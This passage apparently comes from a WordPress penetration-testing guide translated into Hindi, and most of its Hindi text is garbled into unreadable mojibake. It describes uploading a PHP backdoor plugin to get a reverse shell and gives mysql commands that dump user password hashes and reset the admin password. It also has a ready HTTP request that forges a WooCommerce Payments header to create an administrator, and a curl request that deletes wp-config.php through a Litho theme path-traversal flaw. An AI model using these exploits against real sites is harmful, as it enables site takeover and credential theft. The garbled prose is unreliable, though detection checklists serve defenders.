рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ .php рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкреНрд▓рдЧрдЗрди рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ.\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ php backdoor рдмрдирд╛рдПрдВ:

![](<../../images/image (183).png>)

рдлрд┐рд░ рдПрдХ рдирдпрд╛ рдкреНрд▓рдЧрдЗрди рдЬреЛрдбрд╝реЗрдВ:

![](<../../images/image (722).png>)

рдкреНрд▓рдЧрдЗрди рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ Install Now рджрдмрд╛рдПрдБ:

![](<../../images/image (249).png>)

Procced рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](<../../images/image (70).png>)

рд╢рд╛рдпрдж рдЗрд╕рд╕реЗ рдХреБрдЫ рд╣реЛрддрд╛ рд╣реБрдЖ рджрд┐рдЦрд╛рдИ рди рджреЗ, рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк Media рдкрд░ рдЬрд╛рдПрдБ рддреЛ рдЖрдк рдЕрдкрдирд╛ shell рдЕрдкрд▓реЛрдб рд╣реБрдЖ рджреЗрдЦреЗрдВрдЧреЗ:

![](<../../images/image (462).png>)

рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВ рдФрд░ рдЖрдк reverse shell рдХреЛ execute рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП URL рджреЗрдЦреЗрдВрдЧреЗ:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

рдпрд╣ рд╡рд┐рдзрд┐ рдПрдХ рдРрд╕реЗ malicious plugin рдХреА рд╕реНрдерд╛рдкрдирд╛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИ рдЬрд┐рд╕реЗ vulnerable рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ web shell рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ WordPress dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рдореНрдирд╛рдиреБрд╕рд╛рд░ рдХреА рдЬрд╛рддреА рд╣реИ:

1. **Plugin Acquisition**: рдкреНрд▓рдЧрдЗрди рдХреЛ Exploit DB рдЬреИрд╕реЗ рд╕реНрд░реЛрдд рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard рдкрд░ рдЬрд╛рдПрдБ, рдлрд┐рд░ `Dashboard > Plugins > Upload Plugin` рдкрд░ рдЬрд╛рдПрдБред
- рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП рдкреНрд▓рдЧрдЗрди рдХреА zip рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
3. **Plugin Activation**: рдПрдХ рдмрд╛рд░ рдкреНрд▓рдЧрдЗрди рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдЗрд╕реЗ dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
4. **Exploitation**:
- рдкреНрд▓рдЧрдЗрди "reflex-gallery" рдЗрдВрд╕реНрдЯреЙрд▓ рдФрд░ рд╕рдХреНрд░рд┐рдп рд╣реЛрдиреЗ рдкрд░, рдЗрд╕рдХрд╛ exploit рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ vulnerable рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред
- рдЗрд╕ vulnerability рдХреЗ рд▓рд┐рдП Metasploit framework exploit рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЙрдкрдпреБрдХреНрдд module рд▓реЛрдб рдХрд░рдХреЗ рдФрд░ рдирд┐рд╢реНрдЪрд┐рдд commands рдЪрд▓рд╛рдХрд░, рдПрдХ meterpreter session рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕рд╛рдЗрдЯ рдХреЛ unauthorized access рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
- рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ WordPress рд╕рд╛рдЗрдЯ рдХрд╛ exploit рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдХреЗрд╡рд▓ рдПрдХ рд╣реИред

рд╕рд╛рдордЧреНрд░реА рдореЗрдВ WordPress dashboard рдореЗрдВ рдкреНрд▓рдЧрдЗрди рдЗрдВрд╕реНрдЯреЙрд▓ рдФрд░ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рдЪрд░рдгреЛрдВ рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓реЗ рджреГрд╢реНрдпреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рд╕рд╣реА authorization рдХреЗ рдмрд┐рдирд╛ рдЗрд╕ рддрд░рд╣ рдХреА vulnerabilities рдХрд╛ exploit рдХрд░рдирд╛ illegal рдФрд░ unethical рд╣реИред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдЬрд┐рдореНрдореЗрджрд╛рд░реА рд╕реЗ рдФрд░ рдХреЗрд╡рд▓ рдХрд╛рдиреВрдиреА рд╕рдВрджрд░реНрдн рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ рдХрд┐ penetration testing рдЬрд┐рд╕рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдЕрдиреБрдорддрд┐ рд╣реЛред

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSS рд╕реЗ RCE рддрдХ

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬреЛ WordPress рдореЗрдВ рдПрдХ **Cross-Site Scripting (XSS)** vulnerability рдХреЛ **Remote Code Execution (RCE)** рдпрд╛ рдЕрдиреНрдп critical vulnerabilities рдореЗрдВ escalate рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХреА рдЧрдИ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) рджреЗрдЦреЗрдВред рдпрд╣ Wordpress Versions 6.X.X, 5.X.X and 4.X.X рдХреЗ рд▓рд┐рдП support рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
- _**Privilege Escalation:**_ WordPress рдореЗрдВ рдПрдХ user рдмрдирд╛рддрд╛ рд╣реИред
- _**(RCE) Custom Plugin (backdoor) Upload:**_ рдЕрдкрдиреЗ custom plugin (backdoor) рдХреЛ WordPress рдкрд░ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
- _**(RCE) Built-In Plugin Edit:**_ WordPress рдореЗрдВ Built-In Plugins рдХреЛ edit рдХрд░реЗрдВред
- _**(RCE) Built-In Theme Edit:**_ WordPress рдореЗрдВ Built-In Themes рдХреЛ edit рдХрд░реЗрдВред
- _**(Custom) Custom Exploits:**_ Third-Party WordPress Plugins/Themes рдХреЗ рд▓рд┐рдП custom Exploitsред

## рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

рдпреВрдЬрд╝рд░рдиреЗрдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin password рдмрджрд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

рдпрд╣ рдЬрд╛рдирдирд╛ рдХрд┐ рдПрдХ Wordpress plugin рдХреИрд╕реЗ functionality рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЙрд╕рдХреА functionality рдореЗрдВ vulnerabilities рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд╣рдо рд╣реИред рдиреАрдЪреЗ рджрд┐рдП рдмрд┐рдВрджреБрдУрдВ рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдПрдХ plugin рдХрд┐рд╕ рддрд░рд╣ functionality рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХреБрдЫ vulnerable plugins рдХреЗ рдЙрджрд╛рд╣рд░рдг [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) рдореЗрдВ рдорд┐рд▓реЗрдВрдЧреЗред

- **`wp_ajax`**

Plugins рдореЗрдВ functions рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ AJAX handlers рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрддрд╛ рд╣реИред рдЗрдирдореЗрдВ logic, authorization, рдпрд╛ authentication bugs рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдХреНрд╕рд░ рдпреЗ functions authentication рдФрд░ authorization рджреЛрдиреЛрдВ рдХреЛ рдПрдХ wordpress nonce рдХреА рдореМрдЬреВрджрдЧреА рдкрд░ рдмреЗрд╕ рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ **Wordpress instance рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ** (рдЙрд╕рдХреЗ role рд╕реЗ рд╕реНрд╡рддрдВрддреНрд░ рд░реВрдк рд╕реЗ)ред

рдпреЗ рд╡реЗ functions рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ plugin рдореЗрдВ рдХрд┐рд╕реА function рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` рдХрд╛ рдЙрдкрдпреЛрдЧ endpoint рдХреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдЕрдкреНрд░рдорд╛рдгреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛) рджреНрд╡рд╛рд░рд╛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдмрдирд╛рддрд╛ рд╣реИред**

> [!CAUTION]
> рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЛ `wp_verify_nonce` рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдЬрд╛рдБрдЪ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ рдпрд╣ рдЬрд╛рдБрдЪрддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рд╣реИ; рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рднреВрдорд┐рдХрд╛ рдХреА рдЬрд╛рдБрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ред рдЗрд╕рд▓рд┐рдП рдХрдо-рдкреНрд░рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЪреНрдЪ-рдкреНрд░рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рдкрд╣реБрдБрдЪ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

- **REST API**

wordpress рд╕реЗ functions рдХреЛ `register_rest_route` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ rest AP рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рдХреЗ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` рдПрдХ callback рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬреЛ рдЬрд╛рдБрдЪ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рджрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ API рдореЗрдердб рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХреГрдд рд╣реИ рдпрд╛ рдирд╣реАрдВред

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **php рдлрд╝рд╛рдЗрд▓ рддрдХ рд╕реАрдзреА рдкрд╣реБрдБрдЪ**

рдмреЗрд╢рдХ, Wordpress PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ plugins рдХреЗ рдЕрдВрджрд░ рдХреА рдлрд╛рдЗрд▓реЗрдВ рд╡реЗрдм рд╕реЗ рд╕реАрдзреЗ рдПрдХреНрд╕реЗрд╕ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХреЛрдИ plugin рдРрд╕реА рдХрд┐рд╕реА рдХрдордЬреЛрд░ рдлрд╝рдВрдХреНрд╢рдиреИрд▓рд┐рдЯреА рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдкрд░ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддреА рд╣реИ, рддреЛ рд╡рд╣ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╢реЛрд╖рд┐рдд рдХреА рдЬрд╛ рд╕рдХреЗрдЧреАред

### Trusted-header REST impersonation (WooCommerce Payments тЙд 5.6.1)

рдХреБрдЫ plugins рдЖрдВрддрд░рд┐рдХ integrations рдпрд╛ reverse proxies рдХреЗ рд▓рд┐рдП тАЬtrusted headerтАЭ рд╢реЙрд░реНрдЯрдХрдЯ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЙрд╕ header рдХрд╛ рдЙрдкрдпреЛрдЧ REST requests рдХреЗ рд▓рд┐рдП рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдЕрдЧрд░ header рдХреЛ рдХрд┐рд╕реА upstream рдХрдореНрдкреЛрдиреЗрдВрдЯ рджреНрд╡рд╛рд░рд╛ рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд┐рдХрд▓реА request рдХреЗ рд╕рд╛рде рдмрд╛рдБрдзрд╛ рдирд╣реАрдВ рдЧрдпрд╛ рд╣реИ, рддреЛ рдПрдХ attacker рдЗрд╕реЗ spoof рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ privileged REST routes рдХреЛ рдПрдХ administrator рдХреЗ рд░реВрдк рдореЗрдВ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

- рдкреНрд░рднрд╛рд╡: рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ privilege escalation рдХрд░ admin рдмрдирдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ тАФ core users REST route рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирдпрд╛ administrator рдмрдирд╛рдХрд░ред
- рдЙрджрд╛рд╣рд░рдг рд╣реЗрдбрд░: `X-Wcpay-Platform-Checkout-User: 1` (user ID 1 рдХреЛ рдлреЛрд░реНрд╕ рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдкрд╣рд▓рд╛ administrator рдЕрдХрд╛рдЙрдВрдЯ)ред
- рд╢реЛрд╖рд┐рдд рд░реВрдЯ: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- рдкреНрд▓рдЧрдЗрди рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ-рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЗрдбрд░ рдХреЛ authentication state рд╕реЗ рдореИрдк рдХрд░рддрд╛ рд╣реИ рдФрд░ capability checks рдХреЛ рд╕реНрдХрд┐рдк рдХрд░ рджреЗрддрд╛ рд╣реИред
- WordPress core рдЗрд╕ route рдХреЗ рд▓рд┐рдП `create_users` capability рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ; рдкреНрд▓рдЧрдЗрди рдХрд╛ рд╣реИрдХ рд╣реЗрдбрд░ рд╕реЗ рд╕реАрдзреЗ current user context рд╕реЗрдЯ рдХрд░рдХреЗ рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рджреЗрддрд╛ рд╣реИред

Expected success indicators

- HTTP 201 рдЙрд╕ JSON рдмреЙрдбреА рдХреЗ рд╕рд╛рде рдЬреЛ рдмрдирд╛рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рд╡рд░реНрдгрди рдХрд░реЗред
- рдПрдХ рдирдпрд╛ admin user рдЬреЛ `wp-admin/users.php` рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗред

Detection checklist

- grep рдХрд░реЗрдВ `getallheaders()`, `$_SERVER['HTTP_...']`, рдпрд╛ рдЙрди vendor SDKs рдХреЗ рд▓рд┐рдП рдЬреЛ рдХрд╕реНрдЯрдо рд╣реЗрдбрд░реНрд╕ рдкрдврд╝рдХрд░ user context рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ (рдЙрджрд╛., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- рдЙрди REST registrations рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдЬрд╣рд╛рдБ privileged callbacks рдордЬрдмреВрдд `permission_callback` checks рдХреЗ рдмрд┐рдирд╛ рд╣реИрдВ рдФрд░ рдЗрд╕рдХреЗ рдмрдЬрд╛рдп request headers рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВред
- рдЙрди REST handlers рдХреЗ рдЕрдВрджрд░ core user-management functions (`wp_insert_user`, `wp_create_user`) рдХреЗ рдЙрдкрдпреЛрдЧ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ рдХреЗрд╡рд▓ header values рд╕реЗ gated рд╣реИрдВред

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes рдФрд░ plugins рдЕрдХреНрд╕рд░ AJAX handlers рдХреЛ `wp_ajax_` рдФрд░ `wp_ajax_nopriv_` hooks рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рддреЗ рд╣реИрдВред рдЬрдм **_nopriv_** рд╡реИрд░рд┐рдПрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ рддреЛ **callback рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг рд╡рд╛рд▓реЗ рд╡рд┐рдЬрд╝рд┐рдЯрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдХрд┐рд╕реА рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рд░реВрдк рд╕реЗ рдирд┐рдореНрди рд▓рд╛рдЧреВ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП:

1. рдПрдХ **capability check** (рдЬреИрд╕реЗ `current_user_can()` рдпрд╛ рдХрдо рд╕реЗ рдХрдо `is_user_logged_in()`), рдФрд░
2. рдПрдХ **CSRF nonce** рдЬрд┐рд╕реЗ `check_ajax_referer()` / `wp_verify_nonce()` рд╕реЗ validate рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдФрд░
3. **рдХрдареЛрд░ рдЗрдирдкреБрдЯ sanitisation / validation**ред

Litho multipurpose theme (< 3.1) рдиреЗ рдЗрди 3 рдирд┐рдпрдВрддреНрд░рдгреЛрдВ рдХреЛ *Remove Font Family* рдлреАрдЪрд░ рдореЗрдВ рднреВрд▓ рдЧрдпрд╛ рдФрд░ рдЕрдВрддрддрдГ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб (рд╕рд░рд▓реАрдХреГрдд) ship рдХрд░ рджрд┐рдпрд╛:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
рдЗрд╕ рд╕реНрдирд┐рдкреЗрдЯ рд╕реЗ рдЙрддреНрдкрдиреНрди рд╕рдорд╕реНрдпрд╛рдПрдБ:

* **рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдкрд╣реБрдБрдЪ** тАУ `wp_ajax_nopriv_` hook рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* **No nonce / capability check** тАУ рдХреЛрдИ рднреА рд╡рд┐рдЬрд╝рд┐рдЯрд░ endpoint рдХреЛ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **No path sanitisation** тАУ userтАСcontrolled `fontfamily` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдмрд┐рдирд╛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ filesystem path рд╕реЗ рдЬреЛрдбрд╝ рджреА рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рд╕рд┐рдХ `../../` traversal рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

#### рд╢реЛрд╖рдг

рдПрдХ attacker рдПрдХ рд╣реА HTTP POST request рднреЗрдЬрдХрд░ uploads base directory рдХреЗ рдиреАрдЪреЗ рдХрд┐рд╕реА рднреА file рдпрд╛ directory рдХреЛ рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИ (рдЖрдорддреМрд░ рдкрд░ `<wp-root>/wp-content/uploads/`):
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### рдбрд┐рдЯреЗрдХреНрд╢рди рдЪреЗрдХрд▓рд┐рд╕реНрдЯ

* рдХреЛрдИ рднреА `add_action( 'wp_ajax_nopriv_...')` callback рдЬреЛ рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рд╣реЗрд▓реНрдкрд░реНрд╕ (`copy()`, `unlink()`, `$wp_filesystem->delete()`, рдЖрджрд┐) рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред
* paths рдореЗрдВ unsanitised user input рдХрд╛ concatenation (рджреЗрдЦреЗрдВ `$_POST`, `$_GET`, `$_REQUEST`)ред
* `check_ajax_referer()` рдФрд░ `current_user_can()`/`is_user_logged_in()` рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ред

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

рдХрдИ plugins рдПрдХ "view as role" рдпрд╛ temporary role-switching рдлреАрдЪрд░ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ original role(s) рдХреЛ user meta рдореЗрдВ рд╕реЗрд╡ рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдмрд╛рдж рдореЗрдВ restore рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрджрд┐ restoration path рдХреЗрд╡рд▓ request parameters (рдЙрджрд╛., `$_REQUEST['reset-for']`) рдФрд░ рдПрдХ plugin-maintained рд╕реВрдЪреА рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ capabilities рд╡ valid nonce рдХреА рдЬрд╛рдБрдЪ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА, рддреЛ рдпрд╣ рдПрдХ vertical privilege escalation рдмрди рдЬрд╛рддрд╛ рд╣реИред

